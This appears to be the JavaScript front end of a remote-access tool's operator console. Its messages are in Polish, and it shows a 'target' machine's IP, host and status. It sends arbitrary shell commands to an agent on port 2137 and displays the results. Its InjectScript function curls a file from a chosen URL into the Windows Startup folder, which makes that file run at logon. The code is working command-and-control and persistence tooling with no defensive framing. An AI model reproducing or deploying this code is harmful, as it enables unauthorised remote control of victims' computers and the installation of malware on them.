document.addEventListener("DOMContentLoaded", function () {
    const consoleDiv = document.getElementById("console");
    const inputElement = document.getElementById("input");
    const inputUrl = document.getElementById("filename");
    const inputName = document.getElementById("fileurl");
    const ClientInfo = document.getElementById("client_info");
    const popup = document.querySelector("#popup")

    const urlPattern = /^(https?:\/\/)?([\w.-]+\.[a-z]{2,})(\/\S*)?$/i;
    const filenamePattern = /^[a-zA-Z0-9_-]+\.[a-zA-Z]{2,5}$/;

    let target_IP;

    function openConsoleAt(IP, Host, Online) {

        ClientInfo.innerHTML = 
        `
            ${IP} <br>
            ${Host} <br>
            ${Online}
        `
        popup.classList.toggle("widziszMnie")
        
        target_IP = IP
    }
    
    function appendToConsole(message) {
        const newLines = message.split('\n');
        newLines.forEach((line) => {
            const newLine = document.createElement("div");
            newLine.textContent = line;
            consoleDiv.appendChild(newLine);
        });

        consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

    async function InjectScript() {
        const command = `cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup && curl ${inputUrl.value} --output ${inputName.value}`;


        if (inputName.value == '' || inputUrl.value == '') {
            alert("Empty Inputs")
        } else {
            if (filenamePattern.test(inputName.value) && urlPattern.test(inputUrl.value)) {
                    try {
                        const response = await fetch(`http://${target_IP}:2137/execute_command`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ command })
                        });
            
                        const result = await response.json();
            
                        if (result.status === 'success') {
                            appendToConsole(`${result.result}`);
                        } else {
                            appendToConsole(`Błąd: ${result.error}`);
                        }
                    } catch (error) {
                        console.error('Wystąpił błąd:', error);
                    }
                } else {
                    alert("Invalid Inputs");
                }
            }
            
        
    }

    async function sendCommand() {
        const command = inputElement.value.trim();
        inputElement.value = '';

        if (command) {
            try {
                const response = await fetch(`http://${target_IP}:2137/execute_command`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ command })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    appendToConsole(`${result.result}`);
                } else {
                    appendToConsole(`Błąd: ${result.error}`);
                }
            } catch (error) {
                console.error('Wystąpił błąd:', error);
            }
        }
    }

    inputElement.addEventListener('keydown', function (event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            sendCommand();
        }
    });


    window.sendCommand = sendCommand;
    window.InjectScript = InjectScript;
    window.openConsoleAt = openConsoleAt;
});